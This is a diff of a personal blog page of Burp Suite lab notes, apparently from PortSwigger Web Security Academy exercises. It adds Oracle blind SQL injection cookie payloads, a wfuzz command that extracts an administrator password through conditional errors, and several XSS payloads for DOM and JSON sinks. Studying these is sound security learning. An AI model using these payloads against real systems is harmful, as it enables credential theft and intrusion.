@@ -57,7 +57,7 @@
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-14T21:57:34+08:00","datePublished":"2022-05-10T11:33:00+08:00","description":"sql injection","headline":"BurpSuite Lab","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BurpSuite-Lab/"},"url":"/posts/BurpSuite-Lab/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-16T21:28:13+08:00","datePublished":"2022-05-10T11:33:00+08:00","description":"sql injection","headline":"BurpSuite Lab","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/BurpSuite-Lab/"},"url":"/posts/BurpSuite-Lab/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
@@ -556,30 +556,6 @@
       
 
     
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
 
     
 
@@ -659,12 +635,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1652536654"
+    data-ts="1652707693"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-05-14
+  2022-05-16
 </em>
 
       </span>
@@ -690,8 +666,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="189 words">
-  <em>1 min</em> read</span>
+  title="532 words">
+  <em>2 min</em> read</span>
 
 
       <!-- page views -->
@@ -738,6 +714,19 @@
 26
 27
 28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
 </pre></td><td class="rouge-code"><pre>'+OR+1=1--
 '+UNION+SELECT+NULL,NULL--
 
@@ -766,20 +755,33 @@ TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
 
+-- blind, error based, 
+TrackingId=qi1dv3ezFEfn1WHY' || (select '' from users where rownum=1) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK
+-- WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation. 
+-- Conditional errors
+-- You can test a single boolean condition and trigger a database error if the condition is true. Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+-- check if administrator exists.
+Cookie: TrackingId=qi1dv3ezFEfn1WHY' || (SELECT CASE WHEN (length(password)&gt;19) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' ) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK
+-- when 19, return code500, mean &gt; 19 is true; when 20, return code200, mean &gt; 20 is false.
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+-- blind test password
+-- wfuzz is much quicker than intruder.
+wfuzz -H "Cookie: TrackingId=qi1dv3ezFEfn1WHY' || (SELECT CASE WHEN (SUBSTR(password,1,6)='1psbwFUZZ') THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' ) ||'; session=oAr6CBmB8X7rdA5tS8FQRfcfX1qELUtK" -u https://aca41fa31e42c37cc0b00aa9001a0095.web-security-academy.net/filter?category=Pets -w /home/kali/wordlist/alphanum --sc 500
 </pre></td></tr></tbody></table></code></div></div>
 
 <h1 id="cross-site-scripting">Cross-site scripting</h1>
 
-<h4 id="reflected-xss"><span class="mr-2">Reflected XSS</span><a href="#reflected-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 <ul>
   <li>url <code class="language-plaintext highlighter-rouge">web-security-academy.net/?search=&lt;script&gt;alert%281%29&lt;%2Fscript&gt;</code></li>
   <li><code class="language-plaintext highlighter-rouge">&lt;script&gt; alert(1) &lt;/script&gt;</code></li>
 </ul>
 
-<h4 id="dom-xss"><span class="mr-2">DOM XSS</span><a href="#dom-xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<ul>
-  <li>“View source” option won’t work for DOM XSS testing</li>
-</ul>
+<hr />
+
+<p>“View source” option won’t work for DOM XSS testing</p>
+
+<hr />
 
 <p>document.write</p>
 <div class="language-js highlighter-rouge"><div class="code-header">
@@ -799,9 +801,9 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 	<span class="nx">trackSearch</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></div></div>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">"&gt;&lt;svg onload=alert(1)&gt;</code></li>
-</ul>
+<p><code class="language-plaintext highlighter-rouge">"&gt;&lt;svg onload=alert(1)&gt;</code></p>
+
+<hr />
 
 <p>innerHTML</p>
 <div class="language-javascript highlighter-rouge"><div class="code-header">
@@ -823,20 +825,73 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 <span class="p">}</span>
 
 </pre></td></tr></tbody></table></code></div></div>
+<p><code class="language-plaintext highlighter-rouge">&lt;img src=1 onerror=alert(1)&gt;</code></p>
+
+<hr />
+
+<p>jQuery selector sink</p>
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nx">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">hashchange</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">post</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">section.blog-list h2:contains(</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">)</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">post</span><span class="p">)</span> <span class="nx">post</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nx">scrollIntoView</span><span class="p">();</span>
+<span class="p">});</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">author</span><span class="dl">"</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span><span class="mi">0</span><span class="nx">xZEN</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
+</span></pre></td></tr></tbody></table></code></div></div>
+<hr />
+
+<p>HTML <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> href Attribute</p>
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">&lt;img src=1 onerror=alert(1)&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">&lt;a href="URL"&gt;</code></li>
+  <li>The URL of the link.
+Possible values:</li>
+  <li>An absolute URL - points to another web site (like href=”http://www.example.com/default.htm”)</li>
+  <li>A relative URL - points to a file within a web site (like href=”default.htm”)</li>
+  <li>Link to an element with a specified id within the page (like href=”#section2”)</li>
+  <li>Other protocols (like https://, ftp://, mailto:, file:, etc..)</li>
+  <li>A script (like href=”javascript:alert(‘Hello’);”)    THIS ONE CAN BE USED TO XSS.</li>
 </ul>
 
-<p>href attribute</p>
+<hr />
+
+<p>AngularJS expression</p>
 <div class="language-javascript highlighter-rouge"><div class="code-header">
         <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>
 </pre></td></tr></tbody></table></code></div></div>
-<ul>
-  <li><code class="language-plaintext highlighter-rouge"></code></li>
-</ul>
 
+<hr />
+
+<p>Reflected DOM XSS</p>
+<ul>
+  <li>reflected in json format
+    <div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="dl">"</span><span class="s2">results</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">searchTerm</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">asd</span><span class="dl">"</span><span class="p">}</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+    <p>search: <code class="language-plaintext highlighter-rouge">\"-alert(1)}//</code></p>
+    <div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="dl">"</span><span class="s2">results</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">searchTerm</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="se">\\</span><span class="dl">"</span><span class="o">-</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)}</span><span class="c1">//"}</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+  <li>note:  <code class="language-plaintext highlighter-rouge">\</code> can not be interpretered alone, so if only one \ will be error in json.</li>
+  <li><code class="language-plaintext highlighter-rouge">a = {"results":[],"searchTerm":"\\\"}</code> Error</li>
+  <li><code class="language-plaintext highlighter-rouge">a = {"results":[],"searchTerm":"\\\\"}</code> Good</li>
+  <li>An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called.</li>
+</ul>
 
 </div>
 
@@ -959,12 +1014,12 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
         
         
         
-      <li><a href="/posts/cryptography/">cryptography</a></li>
+      <li><a href="/posts/BurpSuite-Lab/">BurpSuite Lab</a></li>
       
         
         
         
-      <li><a href="/posts/BurpSuite-Lab/">BurpSuite Lab</a></li>
+      <li><a href="/posts/cryptography/">cryptography</a></li>
       
         
         
